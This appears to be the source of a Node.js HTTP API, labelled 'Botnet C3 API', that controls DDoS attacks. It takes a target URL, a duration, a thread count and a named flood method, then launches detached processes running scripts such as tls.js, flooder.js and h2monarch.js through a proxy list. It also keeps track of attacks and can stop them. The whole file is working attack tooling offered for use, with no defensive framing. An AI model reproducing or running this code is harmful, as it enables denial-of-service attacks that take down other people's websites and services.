// api.js - Botnet C3 API - VERSÃO DEFINITIVA
const http = require('http');
const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');

const PORT = 8080;
const PROXY_FILE = 'proxy.txt';
const FIXED_RPS = 5;
const MAX_TIME = 9999999;
const MAX_THREADS = 10;

const METHODS = {
    'kill': { script: 'gpzkill.js', nome: 'KILL' },
    'ar': { script: 'ar.js', nome: 'GPZ-AR' },
    'gpz-ar': { script: 'ar.js', nome: 'GPZ-AR' },
    'wx': { script: 'gpzwx.js', nome: 'WX' },
    'gpz-wx': { script: 'gpzwx.js', nome: 'WX' },
    'tls': { script: 'tls.js', nome: 'TLS' },
    'tls1': { script: 'tls1.js', nome: 'TLS1' },
    'http': { script: 'http.js', nome: 'HTTP' },
    'flooder': { script: 'flooder.js', nome: 'FLOODER' },
    'c3': { script: 'c3.js', nome: 'C3' },
    'cloud': { script: 'cloud.js', nome: 'CLOUD' },
    'tek': { script: 'tek.js', nome: 'TEK' },
    'h2monarch': { script: 'h2monarch.js', nome: 'H2-MONARCH' }
};

let totalAttacks = 0;
const activeAttacks = new Map();

function log(msg) {
    const ts = new Date().toLocaleTimeString('pt-BR');
    console.log(`[${ts}] ${msg}`);
}

function sendJson(res, status, data) {
    res.writeHead(status, {
        'Content-Type': 'application/json; charset=utf-8',
        'Access-Control-Allow-Origin': '*'
    });
    res.end(JSON.stringify(data, null, 2));
}

function getMetodosNomes() {
    return [...new Set(Object.values(METHODS).map(m => m.nome))];
}

function gerarId() {
    return Math.floor(100000 + Math.random() * 900000);
}

function matarProcesso(proc) {
    if (!proc) return;
    try {
        if (process.platform === 'win32') spawn('taskkill', ['/pid', proc.pid, '/f', '/t']);
        else process.kill(-proc.pid, 'SIGKILL');
    } catch (e) {}
}

function pararAtaque(id) {
    const idNum = parseInt(id, 10);
    if (!activeAttacks.has(idNum)) return { status: false, error: 'Ataque não encontrado' };
    const attack = activeAttacks.get(idNum);
    matarProcesso(attack.process);
    activeAttacks.delete(idNum);
    log(`🛑 Ataque ${idNum} parado`);
    return { id: idNum, status: true, message: 'Parado' };
}

function iniciarAtaque(alvo, time, threads, metodoKey) {
    const metodo = METHODS[metodoKey.toLowerCase()];
    if (!metodo) return { status: false, error: 'Método inválido' };

    let targetUrl = alvo.trim();
    if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
        targetUrl = 'https://' + targetUrl;
    }

    const timeNum = parseInt(time, 10);
    const threadsNum = parseInt(threads, 10);

    if (isNaN(timeNum) || timeNum < 1) return { status: false, error: 'Time inválido' };
    if (isNaN(threadsNum) || threadsNum < 1 || threadsNum > MAX_THREADS) {
        return { status: false, error: `Ops! Máximo de threads é ${MAX_THREADS}` };
    }

    const scriptPath = path.resolve(__dirname, metodo.script);
    const proxyPath = path.resolve(__dirname, PROXY_FILE);

    if (!fs.existsSync(scriptPath)) {
        return { status: false, error: `Script não encontrado: ${metodo.script}` };
    }

    // Todos os argumentos passados como STRING para evitar erro
    const args = [
        scriptPath,
        targetUrl,
        timeNum.toString(),
        FIXED_RPS.toString(),
        threadsNum.toString(),
        proxyPath
    ];
    
    // Loga o comando exato que está sendo executado (sem erro de tipo)
    log(`🚀 COMANDO: node ${path.basename(scriptPath)} ${targetUrl} ${timeNum} ${FIXED_RPS} ${threadsNum} ${PROXY_FILE}`);

    try {
        const proc = spawn('node', args, {
            stdio: 'ignore',
            detached: true,
            env: { ...process.env, NODE_NO_WARNINGS: '1' }
        });
        proc.unref();

        const attackId = gerarId();
        activeAttacks.set(attackId, {
            id: attackId, target: targetUrl, time: timeNum, threads: threadsNum,
            metodo: metodo.nome, startTime: Date.now(), process: proc
        });

        totalAttacks++;
        
        proc.on('exit', () => {
            activeAttacks.delete(attackId);
            log(`⏹️ Ataque ${attackId} finalizado`);
        });

        return { status: true, id: attackId, alvo: targetUrl, time: timeNum, metado: metodo.nome };
    } catch (err) {
        return { status: false, error: 'Erro ao iniciar: ' + err.message };
    }
}

const server = http.createServer((req, res) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const pathname = url.pathname;

    log(`📥 ${req.method} ${req.url}`);

    if (pathname === '/metado') {
        return sendJson(res, 200, { metados: getMetodosNomes() });
    }

    if (pathname === '/botnetc3api/' || pathname === '/botnetc3api') {
        const params = url.searchParams;
        const alvo = params.get('alvo');
        const time = params.get('time');
        const threads = params.get('threads');
        const metado = params.get('metado');
        const stop = params.get('stop');

        if (stop) {
            const result = pararAtaque(stop);
            return sendJson(res, result.status ? 200 : 400, result);
        }

        if (!alvo || !time || !threads || !metado) {
            return sendJson(res, 400, { status: false, error: 'Parâmetros incompletos' });
        }

        const result = iniciarAtaque(alvo, time, threads, metado);
        return sendJson(res, result.status ? 200 : 400, result);
    }

    sendJson(res, 404, { status: false, error: 'Rota não encontrada' });
});

server.listen(PORT, () => {
    console.log('================================================');
    console.log('  C3 NUCLEAR - API DEFINITIVA');
    console.log('  Porta: ' + PORT);
    console.log('  Max Threads: ' + MAX_THREADS);
    console.log('================================================');
});